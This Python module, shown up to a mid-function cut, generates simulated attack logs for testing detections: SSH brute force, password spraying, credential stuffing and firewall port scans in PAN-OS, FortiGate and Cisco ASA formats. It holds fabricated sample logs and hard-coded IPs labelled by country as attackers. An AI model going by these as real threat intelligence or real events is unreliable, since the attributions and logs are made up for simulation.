"""
Attack Generators — dynamic log generation for attack simulations.

Architecture
------------
- BaseAttackGenerator  : shared __init__ / _get_field_value logic
- SSHBruteForceGenerator, PaloAltoPortScanGenerator, HorizontalPortScanGenerator,
  WindowsTorClientGenerator : concrete generators, each defines FIELD_DEFAULTS
- ATTACK_REGISTRY      : dict[attack_type -> {**metadata, 'generator_class': cls}]
- ALL_ATTACK_TYPES     : alias of ATTACK_REGISTRY (backward-compat for log_senders)
- AttackGeneratorFactory : thin wrapper around the registry

To add a new attack:
  1. Define its metadata dict (same shape as existing entries).
  2. Implement or reuse a generator class (subclass BaseAttackGenerator).
  3. Call _register(attack_dict, GeneratorClass) at module level.
"""

import ipaddress
import random
import re
from datetime import datetime

from log_generators.cisco_asa import CiscoASALogGenerator
from log_generators.cisco_ios import CiscoIOSLogGenerator
from log_generators.fortigate import FortiGateLogGenerator
from log_generators.powershell import PowerShellLogGenerator
from log_generators.sysmon import SysmonLogGenerator
from log_generators.windows_xml import render as render_windows_xml
from xml.sax.saxutils import escape

# ============================================================================
# Shared data
# ============================================================================

COMMON_USERNAMES = [
    # System/default accounts
    'root', 'admin', 'administrator', 'user', 'guest', 'test', 'ubuntu', 'centos',
    'debian', 'ec2-user', 'oracle', 'postgres', 'mysql', 'mongodb', 'redis',
    'git', 'jenkins', 'deploy', 'ansible', 'vagrant', 'docker', 'kubernetes',
    'nagios', 'zabbix', 'prometheus', 'grafana', 'elastic', 'logstash', 'kibana',
    # Common names
    'john', 'jane', 'mike', 'david', 'chris', 'alex', 'sam', 'tom', 'bob', 'alice',
    'steve', 'paul', 'mark', 'james', 'peter', 'jack', 'joe', 'bill', 'dan', 'matt',
    'sarah', 'lisa', 'emma', 'anna', 'kate', 'mary', 'laura', 'susan', 'karen', 'nancy',
    # IT/Dev usernames
    'sysadmin', 'webmaster', 'webadmin', 'ftpuser', 'ftpadmin', 'backup', 'support',
    'helpdesk', 'service', 'daemon', 'www-data', 'apache', 'nginx', 'tomcat',
    'developer', 'dev', 'devops', 'ops', 'engineer', 'tech', 'it', 'infra',
    # Corporate patterns
    'jsmith', 'jdoe', 'asmith', 'bwilson', 'cjohnson', 'dlee', 'ewang', 'fgarcia',
    'gmartin', 'hbrown', 'ijones', 'jmiller', 'kdavis', 'lwilson', 'mmoore', 'ntaylor',
    # Service accounts
    'svc_backup', 'svc_deploy', 'svc_monitor', 'svc_web', 'svc_db', 'svc_app',
    'sa_admin', 'sa_service', 'batch', 'scheduler', 'cron', 'automation',
    # Vendor defaults
    'pi', 'raspberrypi', 'synology', 'qnap', 'netgear', 'linksys', 'cisco',
    'ubnt', 'mikrotik', 'pfsense', 'opnsense', 'vyos', 'arista',
    # Additional common
    'info', 'mail', 'email', 'postmaster', 'sales', 'marketing', 'hr', 'finance',
    'security', 'audit', 'compliance', 'legal', 'ceo', 'cto', 'cfo', 'ciso',
]

ATTACKER_IPS = [
    # Russia
    '185.220.101.45', '185.220.101.46', '185.220.101.47', '185.220.101.48',
    '91.240.118.10',  '91.240.118.11',  '91.240.118.12',  '91.240.118.13',
    '195.54.160.100', '195.54.160.101', '195.54.160.102',
    # China
    '218.92.0.100', '218.92.0.101', '218.92.0.102', '218.92.0.103',
    '61.177.172.50', '61.177.172.51', '61.177.172.52',
    '222.186.30.10', '222.186.30.11', '222.186.30.12',
    # North Korea / Asia
    '175.45.176.10', '175.45.176.11', '175.45.176.12',
    '210.52.109.20', '210.52.109.21', '210.52.109.22',
    # Eastern Europe
    '89.248.167.130', '89.248.167.131', '89.248.167.132',
    '141.98.10.50',   '141.98.10.51',   '141.98.10.52',
    '45.155.205.30',  '45.155.205.31',  '45.155.205.32',
    # Tor exit nodes
    '185.220.100.240', '185.220.100.241', '185.220.100.242',
    '185.220.102.8',   '185.220.102.9',   '185.220.102.10',
    '23.129.64.100',   '23.129.64.101',   '23.129.64.102',
    # VPN/Proxy services often abused
    '104.244.76.50', '104.244.76.51', '104.244.76.52',
    '198.98.56.10',  '198.98.56.11',  '198.98.56.12',
    '209.141.55.20', '209.141.55.21', '209.141.55.22',
    # Random international
    '177.54.150.100', '177.54.150.101',  # Brazil
    '41.215.241.50',  '41.215.241.51',   # Africa
    '103.75.118.20',  '103.75.118.21',   # India
    '185.156.73.30',  '185.156.73.31',   # Netherlands (bulletproof hosting)
]

TARGET_HOSTNAMES = [
    'vmi829310', 'prod-web-01', 'srv-app-01', 'db-master', 'jump-server',
    'bastion-01', 'gateway-01', 'mail-server', 'file-server', 'backup-srv',
]


# ============================================================================
# Base generator
# ============================================================================

def environment_flags(count, ratio, rng=random):
    """Which of `count` events draw from the environment, as close to `ratio`% as whole events allow.

    Proportional rather than a coin per event, so 50% of 5 is 2 or 3 and never 0
    or 5: the whole part is exact, and only the fraction is left to chance, so
    the share over many runs is still the ratio. The order is shuffled.
    """
    exact = count * max(0, min(100, ratio)) / 100
    chosen = int(exact) + (1 if rng.random() < exact - int(exact) else 0)
    flags = [True] * chosen + [False] * (count - chosen)
    rng.shuffle(flags)
    return flags


def draw_environment_identity(environment, skip=(), rng=random):
    """One event's values from the environment, keeping linked accounts on their machine.

    Picks an entity for each entity-backed field, then a user it may show: one of
    that entity's own accounts, else one linked to no machine. A field the
    environment cannot fill is left out, so the event falls back to its default.
    """
    identity = {}
    chosen_links = {}
    for field, records in (environment.get('entities') or {}).items():
        if field in skip or not records:
            continue
        record = rng.choice(records)
        identity[field] = record['value']
        for account_field, users in record['linked'].items():
            chosen_links.setdefault(account_field, []).extend(users)

    for field, unlinked in (environment.get('unlinked') or {}).items():
        if field in skip:
            continue
        candidates = chosen_links.get(field) or unlinked
        if candidates:
            identity[field] = rng.choice(candidates)
    return identity


class BaseAttackGenerator:
    """Shared initialization logic for all attack generators.

    Subclasses must define:
        FIELD_DEFAULTS: dict[field_name -> callable()]
    """

    FIELD_DEFAULTS: dict = {}

    def __init__(self, field_behaviors: dict, options: dict = None):
        options = options or {}
        self.field_behaviors = field_behaviors
        self.event_count = 0
        self._fixed_values = {}
        self._identity = {}

        for field, behavior in field_behaviors.items():
            if behavior == 'fixed':
                override = options.get(f'target_{field}')
                self._fixed_values[field] = override if override else self.FIELD_DEFAULTS[field]()

    def use_identity(self, identity):
        """The environment's values for the next event, or {} for the defaults.

        Set per event by the attack plan, which decides how many events draw from
        the environment. Anything the identity does not carry — or an event with
        none — keeps the field's own behaviour: one value for the run when fixed,
        a fresh one each time when rotating.
        """
        self._identity = identity or {}

    def _get_field_value(self, field_name: str):
        """The environment's value for this event, else the fixed or rotating default."""
        if field_name in self._identity:
            return self._identity[field_name]
        if self.field_behaviors.get(field_name) == 'fixed':
            return self._fixed_values[field_name]
        return self.FIELD_DEFAULTS[field_name]()

    def generate(self) -> str:
        raise NotImplementedError


# ============================================================================
# SSH attack generators
# ============================================================================

SSH_FIELD_DEFAULTS = {
    'user':     lambda: random.choice(COMMON_USERNAMES),
    'src_ip':   lambda: random.choice(ATTACKER_IPS),
    'hostname': lambda: random.choice(TARGET_HOSTNAMES),
    'port':     lambda: random.randint(30000, 65535),
}

# A&I source spec shared by every SSH brute-force-family attack
_SSH_AI_FIELDS = {
    'user':     {'type': 'account', 'account_type': 'standard', 'account_field': 'username',
                 'description': 'Targeted username'},
    'src_ip':   {'type': 'either',  'options': [
                    {'type': 'network_pool', 'role': 'src_pool'},
                    {'type': 'entity', 'entity_type': 'external', 'entity_field': 'ip'},
                 ],
                 'description': 'Attacker public IP'},
    'hostname': {'type': 'entity',  'entity_type': 'server', 'entity_field': 'nt_host',
                 'description': 'Target Linux server hostname'},
    'port':     {'type': 'random',  'description': 'Ephemeral source port (no A&I)'},
}

SSH_ATTACK_TYPES = {
    'ssh_bruteforce': {
        'name': 'SSH Brute Force',
        'description': 'Single attacker targeting one account with repeated password attempts',
        'log_type': 'ssh',
        'category': 'SSH',
        'datamodel': 'Authentication',
        'field_behaviors': {'user': 'fixed', 'src_ip': 'fixed', 'hostname': 'fixed', 'port': 'rotating'},
        'ai_fields': _SSH_AI_FIELDS,
        'sample_logs': [
            'Feb 10 14:23:01 vmi829310 sshd[12345]: Failed password for root from 185.220.101.45 port 43210 ssh2',
            'Feb 10 14:23:02 vmi829310 sshd[12346]: Failed password for root from 185.220.101.45 port 43211 ssh2',
            'Feb 10 14:23:03 vmi829310 sshd[12347]: Failed password for root from 185.220.101.45 port 43212 ssh2',
        ],
    },
    'ssh_password_spraying': {
        'name': 'SSH Password Spraying',
        'description': 'Single attacker trying multiple usernames from one IP',
        'log_type': 'ssh',
        'category': 'SSH',
        'datamodel': 'Authentication',
        'field_behaviors': {'user': 'rotating', 'src_ip': 'fixed', 'hostname': 'fixed', 'port': 'rotating'},
        'ai_fields': _SSH_AI_FIELDS,
        'sample_logs': [
            'Feb 10 14:23:01 vmi829310 sshd[12345]: Failed password for admin from 91.240.118.10 port 52100 ssh2',
            'Feb 10 14:23:02 vmi829310 sshd[12346]: Failed password for invalid user oracle from 91.240.118.10 port 52101 ssh2',
            'Feb 10 14:23:03 vmi829310 sshd[12347]: Failed password for root from 91.240.118.10 port 52102 ssh2',
        ],
    },
    'ssh_credential_stuffing': {
        'name': 'SSH Credential Stuffing',
        'description': 'Distributed attack with rotating users and IPs (leaked credentials)',
        'log_type': 'ssh',
        'category': 'SSH',
        'datamodel': 'Authentication',
        'field_behaviors': {'user': 'rotating', 'src_ip': 'rotating', 'hostname': 'fixed', 'port': 'rotating'},
        'ai_fields': _SSH_AI_FIELDS,
        'sample_logs': [
            'Feb 10 14:23:01 vmi829310 sshd[12345]: Failed password for admin from 218.92.0.100 port 39400 ssh2',
            'Feb 10 14:23:02 vmi829310 sshd[12346]: Failed password for invalid user jsmith from 89.248.167.131 port 41200 ssh2',
            'Feb 10 14:23:03 vmi829310 sshd[12347]: Failed password for root from 175.45.176.10 port 55300 ssh2',
        ],
    },
    'ssh_distributed_bruteforce': {
        'name': 'SSH Distributed Brute Force',
        'description': 'Botnet targeting one account from multiple source IPs',
        'log_type': 'ssh',
        'category': 'SSH',
        'datamodel': 'Authentication',
        'field_behaviors': {'user': 'fixed', 'src_ip': 'rotating', 'hostname': 'fixed', 'port': 'rotating'},
        'ai_fields': _SSH_AI_FIELDS,
        'sample_logs': [
            'Feb 10 14:23:01 vmi829310 sshd[12345]: Failed password for admin from 185.220.101.45 port 43210 ssh2',
            'Feb 10 14:23:02 vmi829310 sshd[12346]: Failed password for admin from 61.177.172.51 port 38100 ssh2',
            'Feb 10 14:23:03 vmi829310 sshd[12347]: Failed password for admin from 141.98.10.50 port 44500 ssh2',
        ],
    },
}


class SSHBruteForceGenerator(BaseAttackGenerator):
    """Generate SSH brute-force / spraying / credential-stuffing logs."""

    FIELD_DEFAULTS = SSH_FIELD_DEFAULTS

    def __init__(self, field_behaviors, options=None):
        super().__init__(field_behaviors, options)
        self.pid_base = random.randint(10000, 99999)

    def generate(self) -> str:
        self.event_count += 1

        user     = self._get_field_value('user')
        src_ip   = self._get_field_value('src_ip')
        hostname = self._get_field_value('hostname')
        port     = self._get_field_value('port')

        timestamp = datetime.now().strftime('%b %d %H:%M:%S')
        pid = self.pid_base + (self.event_count % 100)

        message_types = [
            f"Failed password for invalid user {user} from {src_ip} port {port} ssh2",
            f"Failed password for {user} from {src_ip} port {port} ssh2",
            f"Invalid user {user} from {src_ip} port {port}",
            f"Connection closed by invalid user {user} {src_ip} port {port} [preauth]",
            f"Disconnected from invalid user {user} {src_ip} port {port} [preauth]",
        ]
        message = random.choices(message_types, weights=[0.4, 0.3, 0.15, 0.1, 0.05])[0]

        return f"{timestamp} {hostname} sshd[{pid}]: {message}"


# ============================================================================
# Firewall constants shared by the network attacks
# ============================================================================

#: Cisco device names and the ports a SPAN session is built on. Taken from the
#: cisco_ios generator's own pools so an attack names the same estate.
IOS_HOSTNAMES = ['RTR-CORE-01', 'RTR-CORE-02', 'RTR-EDGE-GW', 'SW-ACCESS-01',
                 'SW-DIST-01', 'SW-DIST-02', 'FW-DMZ-01', 'RTR-BRANCH-01']
IOS_SPAN_INTERFACES = ['GigabitEthernet1/0/1', 'GigabitEthernet1/0/12',
                       'GigabitEthernet1/0/24', 'TenGigabitEthernet1/1/1',
                       'GigabitEthernet0/1']

PA_HOSTNAMES       = ['pa-fw-01', 'pa-fw-02', 'firewall-hq', 'firewall-dc1', 'pan-edge-01', 'pan-core-01']
PA_SERIAL_NUMBERS  = ['012345678901234', '098765432109876', '112233445566778', '223344556677889']
PA_LOG_PROFILES    = ['ForwardToSplunk', 'default', 'siem-forward', 'log-to-panorama']


#: PAN-OS names a private address's location by its RFC 1918 range.
_PRIVATE_RANGES = [
    (ipaddress.ip_network('10.0.0.0/8'), '10.0.0.0-10.255.255.255'),
    (ipaddress.ip_network('172.16.0.0/12'), '172.16.0.0-172.31.255.255'),
    (ipaddress.ip_network('192.168.0.0/16'), '192.168.0.0-192.168.255.255'),
]


def _pan_location(ip):
    try:
        address = ipaddress.ip_address(ip)
    except ValueError:
        return 'unknown'
    return next((name for network, name in _PRIVATE_RANGES if address in network),
                'United States')


def pan_traffic_line(*, hostname, serial, log_profile, src_zone, dest_zone,
                     src_interface, dest_interface, src_ip, dest_ip, dest_port,
                     transport, subtype, action, rule, app='incomplete',
                     bytes_sent=None, bytes_received=None, elapsed=0,
                     session_end=None):
    """One PAN-OS TRAFFIC record, in the column order of the add-on's [extract_traffic].

    Defaults describe a probe: one packet, no answer, `incomplete` application.
    A real session passes its own byte counts and application.
    """
    now = datetime.now()
    header = f"<14>{now.strftime('%b %d %H:%M:%S')} {hostname}"
    timestamp = now.strftime('%Y/%m/%d %H:%M:%S')
    iso_timestamp = now.strftime('%Y-%m-%dT%H:%M:%S.') + f'{random.randint(100, 999)}Z'
    blocked = action != 'allow'

    if bytes_sent is None:
        bytes_sent = random.randint(40, 66)
    if bytes_received is None:
        bytes_received = 0 if blocked else random.randint(40, 66)
    packets = 1 if blocked else max(2, (bytes_sent + bytes_received) // 800)
    if session_end is None:
        session_end = 'policy-deny' if blocked else 'aged-out'

    fields = [
        '1', timestamp, serial, 'TRAFFIC', subtype,
        str(random.randint(2048, 2561)), timestamp,
        src_ip, dest_ip, '0.0.0.0', '0.0.0.0',
        rule, '', '', app, 'vsys1',
        src_zone, dest_zone, src_interface, dest_interface,
        log_profile, timestamp, str(random.randint(10000, 99999)), '1',
        str(random.randint(1024, 65535)), str(dest_port), '0', '0', '0x0', transport, action,
        str(bytes_sent + bytes_received), str(bytes_sent), str(bytes_received),
        str(packets), timestamp, str(elapsed), 'any', '0',
        str(random.randint(100000000, 999999999)), '0x8000000000000000',
        _pan_location(src_ip), _pan_location(dest_ip), '0',
        str(max(1, packets // 2)), str(packets // 2), session_end,
        '0', '0', '0', '0', '', hostname,
        'from-policy', '', '', '0', '', '0', '', '', '0', '0',
        '0', '0', '0', '0', '0x0', '', '', '', '', '', '', '', '',
        '', '', '', '', '', '', '', '', '', '', '', '',
        '0', '0', '0', '0', '0', '0', '0', 'any', 'any', '0',
        iso_timestamp, '0',
    ]
    return f'{header} {",".join(fields)}'


# ============================================================================
# Network attacks seen by several firewalls
# ============================================================================

#: Ports a horizontal scan sweeps for: one service, looked for on every host.
HORIZONTAL_SCAN_TCP_PORTS = [22, 23, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5900, 5985, 8080]
#: Ports whose service is UDP, so a typed one is probed over UDP.
UDP_SERVICE_PORTS = {53, 67, 69, 123, 137, 161, 500, 514, 1900, 5353}

#: Everyday internal sessions for the noise: (port, transport, application).
INTERNAL_SERVICES = [
    (53, 'udp', 'dns'), (88, 'tcp', 'kerberos'), (389, 'tcp', 'ldap'),
    (445, 'tcp', 'ms-ds-smb'), (443, 'tcp', 'ssl'), (3389, 'tcp', 'ms-rdp'),
    (135, 'tcp', 'msrpc'), (123, 'udp', 'ntp'), (1433, 'tcp', 'mssql-db'),
]

#: Names FortiOS gives these services; anything else is written `proto/port`.
FORTIOS_SERVICES = {22: 'SSH', 23: 'TELNET', 53: 'DNS', 80: 'HTTP', 88: 'KERBEROS',
                    123: 'NTP', 135: 'DCE-RPC', 139: 'SAMBA', 161: 'SNMP', 389: 'LDAP',
                    443: 'HTTPS', 445: 'SMB', 1433: 'MS-SQL', 3306: 'MYSQL',
                    3389: 'RDP', 5900: 'VNC'}

#: Address templates for the three RFC 1918 ranges.
_SCAN_RANGES = ['10.{}.{}.{}', '172.{}.{}.{}', '192.168.{}.{}']


def transport_for_port(port):
    return 'udp' if int(port) in UDP_SERVICE_PORTS else 'tcp'


def _ipv4(value):
    """`value` as a dotted IPv4 address, or None."""
    try:
        return str(ipaddress.IPv4Address(str(value).strip()))
    except (ipaddress.AddressValueError, ValueError):
        return None


def random_private_ip(rng=random):
    """A host address in one of the three RFC 1918 ranges."""
    template = rng.choice(_SCAN_RANGES)
    if template.startswith('10.'):
        return template.format(rng.randint(0, 255), rng.randint(0, 255), rng.randint(1, 254))
    if template.startswith('172.'):
        return template.format(rng.randint(16, 31), rng.randint(0, 255), rng.randint(1, 254))
    return template.format(rng.randint(0, 255), rng.randint(1, 254))


def is_rfc1918(ip):
    """True for an address in one of the three ranges the detection keeps."""
    try:
        address = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(address in network for network, _ in _PRIVATE_RANGES)


def _sweep(src_ip, count, taken, rng=random):
    """`count` addresses near `src_ip`, none in `taken`: its /24 first, then the next ones.

    A scanner sweeps the network it landed in, here the /16 around it — 65,000
    hosts, more than any attack asks for. A source outside the private ranges
    sweeps a random private /16 instead, which is still what the detection counts.
    """
    address = src_ip if is_rfc1918(src_ip) else random_private_ip(rng)
    block = ipaddress.IPv4Network(f'{address}/16', strict=False)
    subnets = list(block.subnets(new_prefix=24))
    start = subnets.index(ipaddress.IPv4Network(f'{address}/24', strict=False))
    out = []
    for subnet in subnets[start:] + subnets[:start]:
        if len(out) >= count:
            break
        hosts = [str(h) for h in subnet.hosts() if str(h) not in taken]
        rng.shuffle(hosts)
        chosen = hosts[:count - len(out)]
        taken.update(chosen)
        out += chosen
    return out


def _single_value(choice, field, values, fallback, rng=random, exclude=(), clean=None):
    """One value for a Random / A&I / Custom field.

    A&I ('ai') or Custom carries the chosen or typed value in `value` — the form
    resolves an asset or an identity to the attribute the attack needs, so no
    lookup is done here; A&I without one (or the legacy 'environment') draws from
    the field's environment values. Anything else, and an empty pool, falls back
    to `fallback(rng)`. `exclude` keeps a drawn or generated value off a set, but
    a typed value is the user's and is returned as given.
    """
    choice = choice if isinstance(choice, dict) else {}
    mode = choice.get('mode')
    clean = clean or (lambda v: (str(v).strip() or None) if v is not None else None)
    if mode in ('ai', 'custom'):
        typed = clean(choice.get('value'))
        if typed:
            return typed
    if mode in ('ai', 'environment'):
        candidates = [v for v in (clean(x) for x in values.get(field, [])) if v and v not in exclude]
        if candidates:
            return rng.choice(candidates)
    value = fallback(rng)
    while value in exclude:
        value = fallback(rng)
    return value


def _single_ip(choice, field, values, rng=random, exclude=()):
    """`_single_value` for an address field: anything not an IPv4 is ignored."""
    return _single_value(choice, field, values, random_private_ip, rng, exclude, clean=_ipv4)


def _distinct_ports(total, privileged, rng=random):
    """`total` distinct ports of which `privileged` are below 1024.

    The vertical scan's threshold is on distinct ports per host, split at 1024,
    so the two counts are what the plan controls directly.
    """
    privileged = max(0, min(privileged, total, 1023))
    low = rng.sample(range(1, 1024), privileged)
    high_needed = total - privileged
    high = rng.sample(range(1024, 65536), min(high_needed, 65536 - 1024))
    ports = low + high
    rng.shuffle(ports)
    return ports


class FirewallScanGenerator(BaseAttackGenerator):
    """A port scan as each firewall logs it, one planned probe at a time.

    The plan decides every event's five-tuple and verdict once
    (`plan_identities` on a subclass — horizontal or vertical), so each selected
    firewall records the same probes; this class only renders them the way that
    firewall writes a traffic decision:

      paloalto   TRAFFIC CSV            -> pan:traffic, rule = the policy name
      fortigate  type=traffic forward   -> fortigate_traffic, rule = poluuid
      cisco_asa  %ASA-4-106023 (deny) / %ASA-6-106100 (permit) -> rule = the ACL

    Every one of those carries a `rule`: the detection's tstats groups BY
    All_Traffic.rule, and a row whose BY field is null is dropped. That is why
    the ASA probes are access-list decisions and not 302013 built connections,
    and why a FortiGate probe names an explicit deny policy — the implicit
    policy 0 has no UUID, so no `rule`.
    """

    FIELD_DEFAULTS = {'dest_port': lambda: random.choice(HORIZONTAL_SCAN_TCP_PORTS)}

    #: Share of probes the firewall blocks; the rest reach a host that does not answer.
    BLOCKED_SHARE = 0.85

    def __init__(self, field_behaviors, options=None):
        super().__init__(field_behaviors, options)
        options = options or {}
        self.device = options.get('source_log_type') or 'paloalto'

        # One firewall, one policy set, for the whole run.
        if self.device == 'fortigate':
            self._fortigate = FortiGateLogGenerator(['traffic'])
            self._fortigate.hostnames = [random.choice(self._fortigate.hostnames)]
            self._fortigate.device_ids = [random.choice(self._fortigate.device_ids)]
            self._fortigate.vdoms = ['root']
            self._policies = {
                'blocked': (random.randint(20, 40), FortiGateLogGenerator._uuid(), 'deny-lan-east-west'),
                'allowed': (random.randint(2, 19), FortiGateLogGenerator._uuid(), 'lan-to-servers'),
            }
        elif self.device == 'cisco_asa':
            self._asa = CiscoASALogGenerator(['acl'])
            self._asa.devices = [random.choice(self._asa.devices)]
            self._acl = random.choice(['inside_access_in', 'INSIDE_IN', 'lan_access_in'])
        else:
            self._pan = {'hostname': random.choice(PA_HOSTNAMES),
                         'serial': random.choice(PA_SERIAL_NUMBERS),
                         'log_profile': random.choice(PA_LOG_PROFILES)}

    # ── rendering ───────────────────────────────────────────────────────────

    def generate(self) -> str:
        self.event_count += 1
        return self._render(self._identity)

    def generate_noise(self) -> str:
        return self._render(self._identity)

    def _render(self, event):
        event = {**self._standalone(), **(event or {})}
        render = {'fortigate': self._fortigate_line, 'cisco_asa': self._asa_line}.get(
            self.device, self._pan_line)
        return render(event)

    def _standalone(self):
        """Values for an event rendered outside a plan — a preview or a test."""
        port = self._get_field_value('dest_port')
        return {'src_ip': '10.0.1.50', 'dest_ip': random_private_ip(), 'dest_port': port,
                'transport': transport_for_port(port), 'verdict': 'blocked', 'probe': True}

    def _pan_line(self, e):
        blocked = e['verdict'] == 'blocked'
        if e['probe']:
            session = {}
        else:
            sent, received = random.randint(300, 20000), random.randint(300, 60000)
            session = {'app': e.get('app', 'incomplete'), 'bytes_sent': sent,
                       'bytes_received': 0 if blocked else received,
                       'elapsed': 0 if blocked else random.randint(1, 120),
                       'session_end': 'policy-deny' if blocked else 'tcp-fin'}
        return pan_traffic_line(
            **self._pan, src_zone='trust', dest_zone='servers',
            src_interface='ethernet1/2', dest_interface='ethernet1/3',
            src_ip=e['src_ip'], dest_ip=e['dest_ip'], dest_port=e['dest_port'],
            transport=e['transport'],
            subtype='drop' if blocked else 'end', action='deny' if blocked else 'allow',
            rule='deny-east-west' if blocked else 'allow-lan-to-servers', **session)

    def _fortigate_line(self, e):
        blocked = e['verdict'] == 'blocked'
        policyid, poluuid, policyname = self._policies[e['verdict']]
        port = e['dest_port']
        proto = 17 if e['transport'] == 'udp' else 6
        if blocked or e['probe']:
            sent, received = random.randint(40, 78), 0
            action = 'deny' if blocked else 'timeout'
        else:
            sent, received = random.randint(300, 20000), random.randint(300, 60000)
            action = 'close'
        return self._fortigate._head(
            'traffic', 'forward', '0000000013', 'warning' if blocked else 'notice',
            srcip=e['src_ip'], srcport=random.randint(1024, 65535),
            srcintf='port1', srcintfrole='lan',
            dstip=e['dest_ip'], dstport=port, dstintf='port3', dstintfrole='lan',
            srccountry='Reserved', dstcountry='Reserved',
            sessionid=self._fortigate._session(), proto=proto, action=action,
            policyid=policyid, policytype='policy', poluuid=poluuid, policyname=policyname,
            service=FORTIOS_SERVICES.get(port, f"{e['transport']}/{port}"),
            trandisp='noop', duration=0 if blocked else random.randint(1, 120),
            sentbyte=sent, rcvdbyte=received,
            sentpkt=max(1, sent // 1400), rcvdpkt=received // 1400,
            appcat='unscanned')

    def _asa_line(self, e):
        src_port = random.randint(1024, 65535)
        if e['verdict'] == 'blocked':
            return self._asa._line(4, '106023', (
                f"Deny {e['transport']} src inside:{e['src_ip']}/{src_port} "
                f"dst servers:{e['dest_ip']}/{e['dest_port']} "
                f'by access-group "{self._acl}" [0x0, 0x0]'))
        hash_codes = f'[0x{random.getrandbits(32):08x}, 0x0]'
        return self._asa._line(6, '106100', (
            f"access-list {self._acl} permitted {e['transport']} "
            f"inside/{e['src_ip']}({src_port}) -> servers/{e['dest_ip']}({e['dest_port']}) "
            f"hit-cnt 1 first hit {hash_codes}"))


class HorizontalPortScanGenerator(FirewallScanGenerator):
    """One internal host probing one port on many hosts."""

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities): every event's values, decided once.

        `attacks` is the number of distinct destinations. The source is one
        address for the whole scan — random, drawn from the environment, or
        typed. Destinations come from the environment first when asked, and are
        completed with addresses swept around the source.

        Noise is everyday traffic between other internal hosts, plus an internet
        host knocking on a few servers. Each of its sources reaches fewer
        distinct hosts per port than the detection's threshold, and none is the
        scanner, so noise can neither fire the detection on its own nor add to
        the scan's count.
        """
        detection = definition['detection']
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}
        src_choice = identity.get('src_ip') if isinstance(identity.get('src_ip'), dict) else {}
        dest_choice = identity.get('dest_ip') if isinstance(identity.get('dest_ip'), dict) else {}
        values = (environment or {}).get('values') or {}

        if not src_choice.get('mode') and options.get('target_src_ip'):   # saved before the rework
            src_choice = {'mode': 'custom', 'value': options['target_src_ip']}
        src_ip = _single_ip(src_choice, 'src_ip', values, rng)

        try:
            dest_port = int(options.get('target_dest_port') or 0)
        except (TypeError, ValueError):
            dest_port = 0
        if not 1 <= dest_port <= 65535:
            dest_port = rng.choice(HORIZONTAL_SCAN_TCP_PORTS)
        transport = transport_for_port(dest_port)

        taken = {src_ip}
        destinations = []
        if dest_choice.get('environment'):
            pool = sorted({ip for ip in map(_ipv4, values.get('dest_ip', [])) if ip} - taken)
            rng.shuffle(pool)
            destinations = pool[:attacks]
            taken.update(destinations)
        destinations += _sweep(src_ip, attacks - len(destinations), taken, rng)

        attack_identities = [
            {'src_ip': src_ip, 'dest_ip': dest, 'dest_port': dest_port, 'transport': transport,
             'verdict': 'blocked' if rng.random() < cls.BLOCKED_SHARE else 'allowed', 'probe': True}
            for dest in destinations]

        threshold = detection['threshold']
        noise_identities = []
        if noise:
            # A few servers everyone talks to — well under the threshold, so no
            # source can reach it however many noise events there are.
            servers = sorted({ip for ip in map(_ipv4, values.get('dest_ip', [])) if ip}
                             - {src_ip}) if dest_choice.get('environment') else []
            rng.shuffle(servers)
            servers = servers[:12]
            servers += _sweep(src_ip, max(0, 12 - len(servers)), set(servers) | {src_ip}, rng)
            assert len(servers) < threshold
            clients = _sweep(src_ip, max(4, noise // 25), set(servers) | {src_ip}, rng)
            outsiders = [rng.choice(ATTACKER_IPS) for _ in range(2)]
            for _ in range(noise):
                if rng.random() < 0.1:
                    port = rng.choice([22, 3389, 445])
                    noise_identities.append({
                        'src_ip': rng.choice(outsiders), 'dest_ip': rng.choice(servers),
                        'dest_port': port, 'transport': 'tcp', 'verdict': 'blocked',
                        'probe': True})
                    continue
                port, proto, app = rng.choice(INTERNAL_SERVICES)
                noise_identities.append({
                    'src_ip': rng.choice(clients), 'dest_ip': rng.choice(servers),
                    'dest_port': port, 'transport': proto, 'app': app,
                    'verdict': 'allowed' if rng.random() < 0.95 else 'blocked', 'probe': False})
        return attack_identities, noise_identities


class VerticalPortScanGenerator(FirewallScanGenerator):
    """One internal host probing many ports on one host."""

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities): every event's values, decided once.

        `attacks` is the total number of distinct destination ports (the
        detection's `totalDestPortCount`); `privileged_ports` how many of them
        fall below 1024 (`privilegedDestPortCount`). Both source and destination
        are one address each, from Random / A&I / Custom. Every probe is TCP, to
        the one host — the detection sums the two counts within a single
        transport, so a scan split across TCP and UDP would clear neither half.

        Noise is ordinary internal traffic on a handful of service ports: no
        (src, dest, transport) pair reaches anywhere near 500 distinct ports,
        and none is the scanner reaching the target, so it never fires and never
        adds to the scan's port count.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}
        src_choice = identity.get('src_ip') if isinstance(identity.get('src_ip'), dict) else {}
        dest_choice = identity.get('dest_ip') if isinstance(identity.get('dest_ip'), dict) else {}

        if not src_choice.get('mode') and options.get('target_src_ip'):
            src_choice = {'mode': 'custom', 'value': options['target_src_ip']}
        if not dest_choice.get('mode') and options.get('target_dest_ip'):
            dest_choice = {'mode': 'custom', 'value': options['target_dest_ip']}
        src_ip = _single_ip(src_choice, 'src_ip', values, rng)
        # A host does not scan itself: keep the target off the source, except a
        # source and target the user typed the same on purpose.
        dest_ip = _single_ip(dest_choice, 'dest_ip', values, rng, exclude={src_ip})

        try:
            privileged = int(options.get('privileged_ports', definition.get('extra_counts', [{}])[0].get('default', 20)))
        except (TypeError, ValueError):
            privileged = 20
        ports = _distinct_ports(attacks, max(0, privileged), rng)
        attack_identities = [
            {'src_ip': src_ip, 'dest_ip': dest_ip, 'dest_port': port, 'transport': 'tcp',
             'verdict': 'blocked' if rng.random() < cls.BLOCKED_SHARE else 'allowed', 'probe': True}
            for port in ports]

        noise_identities = []
        if noise:
            clients = _sweep(src_ip, max(4, noise // 25), {src_ip, dest_ip}, rng)
            servers = _sweep(src_ip, 12, set(clients) | {src_ip, dest_ip}, rng)
            outsiders = [rng.choice(ATTACKER_IPS) for _ in range(2)]
            for _ in range(noise):
                if rng.random() < 0.1:
                    port = rng.choice([22, 3389, 445])
                    noise_identities.append({
